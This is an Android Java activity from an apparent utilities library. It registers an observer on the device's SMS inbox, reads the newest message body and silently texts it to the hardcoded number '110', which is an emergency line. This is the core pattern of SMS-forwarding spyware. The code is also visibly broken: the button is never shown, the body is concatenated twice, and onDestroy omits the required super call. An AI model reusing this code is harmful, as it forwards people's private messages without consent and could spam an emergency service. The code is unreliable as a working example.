package com.uncle2000.androidcommonutils.uitls.system.sms;

import android.app.Activity;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;

import com.uncle2000.androidcommonutils.R;

/**
 * Created by 2000 on 2017/4/10.
 */
public class ObserverActivity extends Activity implements View.OnClickListener {

    protected static final String TEL_NUMBER = "110";
    private Button mBtnSend;
    private Uri mSmsUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);//><

        mBtnSend = new Button(this);
        //添加监听
        mBtnSend.setOnClickListener(this);
        //初始化地址
        mSmsUri = Uri.parse("content://sms/");
    }

    @Override
    public void onClick(View v) {
        if (v == mBtnSend) {
//注册observer
            getContentResolver().registerContentObserver(mSmsUri, true, observer);
        }
    }

    //初始化observer
    ContentObserver observer = new ContentObserver(new Handler()) {
        public void onChange(boolean selfChange) {
            //如果变化了
            if (selfChange) {
                Cursor cursor = getContentResolver().query(mSmsUri, new String[]{"body", "date", "address", "type"},
                        null, null, null);
                //读取最新的消息
                cursor.moveToFirst();
                String text = cursor.getString(cursor.getColumnIndex("body")) + "_"
                        + cursor.getString(cursor.getColumnIndex("body"));
                cursor.close();
                //发送短信
                SmsManager sm = SmsManager.getDefault();
                sm.sendTextMessage(TEL_NUMBER, null, text, null, null);
            }
        }

        ;
    };

    @Override
    protected void onDestroy() {
        if (observer != null) {
            getContentResolver().unregisterContentObserver(observer);
            observer = null;
        }
    }
}